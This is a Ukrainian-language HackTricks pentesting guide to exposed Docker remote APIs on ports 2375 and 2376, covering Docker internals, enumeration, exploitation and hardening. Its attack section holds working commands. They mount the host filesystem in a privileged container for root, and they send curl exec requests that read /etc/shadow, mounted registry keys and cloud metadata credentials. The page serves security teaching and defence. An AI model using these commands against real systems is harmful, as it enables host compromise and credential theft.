# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Docker Основи

#### Що таке

Docker є **передовою платформою** в **індустрії контейнеризації**, що веде **безперервні інновації**. Він полегшує безперешкодне створення та розповсюдження додатків, від **традиційних до футуристичних**, і забезпечує їх **безпечне розгортання** в різних середовищах.

#### Основна архітектура docker

- [**containerd**](http://containerd.io): Це **основний виконуваний модуль** для контейнерів, що відповідає за всебічне **управління життєвим циклом контейнера**. Це включає в себе обробку **переносу та зберігання образів**, а також нагляд за **виконанням, моніторингом та мережевими з'єднаннями** контейнерів. **Більш детальна інформація** про containerd **досліджується далі**.
- **container-shim** відіграє критичну роль як **посередник** в обробці **безголових контейнерів**, безперешкодно беручи на себе функції від **runc** після ініціалізації контейнерів.
- [**runc**](http://runc.io): Відомий своїми **легкими та універсальними можливостями виконуваного модуля** контейнерів, runc відповідає **стандарту OCI**. Він використовується containerd для **запуску та управління контейнерами** відповідно до **вказівок OCI**, еволюціонуючи з оригінального **libcontainer**.
- [**grpc**](http://www.grpc.io) є необхідним для **полегшення комунікації** між containerd та **docker-engine**, забезпечуючи **ефективну взаємодію**.
- [**OCI**](https://www.opencontainers.org) є ключовим у підтримці **специфікацій OCI** для виконуваних модулів та образів, при цьому останні версії Docker є **сумісними з обома стандартами OCI для образів та виконуваних модулів**.

#### Основні команди
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** був спеціально розроблений для задоволення потреб контейнерних платформ, таких як **Docker і Kubernetes**, серед інших. Він має на меті **спростити виконання контейнерів** на різних операційних системах, включаючи Linux, Windows, Solaris та інші, абстрагуючи функціональність, специфічну для операційної системи, та системні виклики. Мета Containerd полягає в тому, щоб включити лише основні функції, необхідні його користувачам, прагнучи уникнути непотрібних компонентів. Однак досягти цієї мети повністю вважається складним завданням.

Ключовим дизайнерським рішенням є те, що **Containerd не обробляє мережеві з'єднання**. Мережа вважається критично важливим елементом у розподілених системах, з такими складнощами, як програмно визначена мережа (SDN) та виявлення сервісів, які значно відрізняються від однієї платформи до іншої. Тому Containerd залишає аспекти мережі для управління платформами, які він підтримує.

Хоча **Docker використовує Containerd** для запуску контейнерів, важливо зазначити, що Containerd підтримує лише підмножину функціональностей Docker. Зокрема, Containerd не має можливостей управління мережею, присутніх у Docker, і не підтримує створення Docker swarms безпосередньо. Це відмінність підкреслює зосереджену роль Containerd як середовища виконання контейнерів, делегуючи більш спеціалізовані функціональності платформам, з якими він інтегрується.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** - це відкритий контейнерний движок, який відповідає стандартам [Open Container Initiative (OCI)](https://github.com/opencontainers), розроблений і підтримуваний компанією Red Hat. Він відрізняється від Docker кількома особливими функціями, зокрема **архітектурою без демонів** та підтримкою **контейнерів без прав root**, що дозволяє користувачам запускати контейнери без привілеїв root.

Podman розроблений для сумісності з API Docker, що дозволяє використовувати команди Docker CLI. Ця сумісність поширюється на його екосистему, яка включає інструменти, такі як **Buildah** для створення образів контейнерів і **Skopeo** для операцій з образами, таких як push, pull і inspect. Більше деталей про ці інструменти можна знайти на їхній [сторінці GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Ключові відмінності**

- **Архітектура**: На відміну від клієнт-серверної моделі Docker з фоновим демоном, Podman працює без демона. Цей дизайн означає, що контейнери працюють з привілеями користувача, який їх запускає, підвищуючи безпеку, усуваючи необхідність у доступі root.
- **Інтеграція з Systemd**: Podman інтегрується з **systemd** для управління контейнерами, що дозволяє керувати контейнерами через одиниці systemd. Це контрастує з використанням Docker, який в основному використовує systemd для управління процесом демона Docker.
- **Контейнери без прав root**: Ключовою особливістю Podman є його здатність запускати контейнери з привілеями ініціюючого користувача. Цей підхід мінімізує ризики, пов'язані з порушеннями безпеки контейнерів, забезпечуючи, що зловмисники отримують лише привілеї скомпрометованого користувача, а не доступ root.

Підхід Podman пропонує безпечну та гнучку альтернативу Docker, підкреслюючи управління привілеями користувачів і сумісність з існуючими робочими процесами Docker.

> [!NOTE]
> Зверніть увагу, що оскільки podman прагне підтримувати той же API, що й docker, ви можете використовувати ті ж команди з podman, що й з docker, такі як:
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Основна інформація

Віддалений API за замовчуванням працює на порту 2375, коли він увімкнений. Сервіс за замовчуванням не вимагатиме аутентифікації, що дозволяє зловмиснику запускати привілейований контейнер docker. Використовуючи віддалений API, можна підключити хости / (кореневий каталог) до контейнера та читати/записувати файли середовища хоста.

**Порт за замовчуванням:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Перерахунок

#### Вручну

Зверніть увагу, що для перерахунку API docker ви можете використовувати команду `docker` або `curl`, як у наступному прикладі:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Якщо ви можете **зв'язатися з віддаленим docker API за допомогою команди `docker`**, ви можете **виконати** будь-які з **docker** [**команд, які були раніше** прокоментовані](2375-pentesting-docker.md#basic-commands) для взаємодії з сервісом.

> [!NOTE]
> Ви можете `export DOCKER_HOST="tcp://localhost:2375"` і **уникнути** використання параметра `-H` з командою docker

**Швидке підвищення привілеїв**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Іноді ви можете побачити **2376** активним для **TLS** кінцевої точки. Мені не вдалося підключитися до нього за допомогою docker клієнта, але це можливо зробити за допомогою curl.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Якщо ви хочете більше інформації про це, більше інформації доступно там, звідки я скопіював команди: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Автоматичний
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Компрометація

На наступній сторінці ви можете знайти способи **втекти з контейнера docker**:

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

Зловживаючи цим, можливо втекти з контейнера, ви можете запустити слабкий контейнер на віддаленій машині, втекти з нього і скомпрометувати машину:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Підвищення привілеїв

Якщо ви знаходитесь на хості, який використовує docker, ви можете [**прочитати цю інформацію, щоб спробувати підвищити привілеї**](../linux-hardening/privilege-escalation/index.html#writable-docker-socket).

### Виявлення секретів у запущених контейнерах Docker
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Перевірте **env** (розділ змінних середовища) на наявність секретів, і ви можете знайти:

- Паролі.
- IP-адреси.
- Порти.
- Шляхи.
- Інше… .

Якщо ви хочете витягти файл:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Захист вашого Docker

#### Захист установки та використання Docker

- Ви можете використовувати інструмент [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) для перевірки вашої поточної установки docker.
- `./docker-bench-security.sh`
- Ви можете використовувати інструмент [https://github.com/kost/dockscan](https://github.com/kost/dockscan) для перевірки вашої поточної установки docker.
- `dockscan -v unix:///var/run/docker.sock`
- Ви можете використовувати інструмент [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) для перевірки привілеїв, які контейнер матиме при запуску з різними параметрами безпеки. Це корисно для розуміння наслідків використання деяких параметрів безпеки для запуску контейнера:
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Захист Docker Images

- Ви можете використовувати образ docker з [https://github.com/quay/clair](https://github.com/quay/clair), щоб сканувати ваші інші образи docker і знаходити вразливості.
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Захист Dockerfiles

- Ви можете використовувати інструмент [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) для **перевірки вашого Dockerfile** та знаходження всіх видів неправильних налаштувань. Кожне неправильне налаштування отримає ID, ви можете знайти тут [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md), як виправити кожне з них.
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- Ви можете використовувати інструмент [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) для **перевірки вашого Dockerfile** та знаходження всіх видів неправильних налаштувань.
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- Ви можете використовувати інструмент [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) для **перевірки вашого Dockerfile** та знаходження всіх видів неправильних налаштувань.
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- Ви можете використовувати інструмент [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) для **перевірки вашого Dockerfile** та знаходження всіх видів неправильних налаштувань.
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### Логування підозрілої активності

- Ви можете використовувати інструмент [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) для виявлення **підозрілої поведінки в запущених контейнерах**.
- Зверніть увагу в наступному фрагменті, як **Falco компілює модуль ядра та вставляє його**. Після цього він завантажує правила та **починає логувати підозрілу активність**. У цьому випадку він виявив 2 привілейовані контейнери, один з яких мав чутливе монтування, і через кілька секунд виявив, як у одному з контейнерів було відкрито оболонку.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Моніторинг Docker

Ви можете використовувати auditd для моніторингу docker.

### Посилання

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
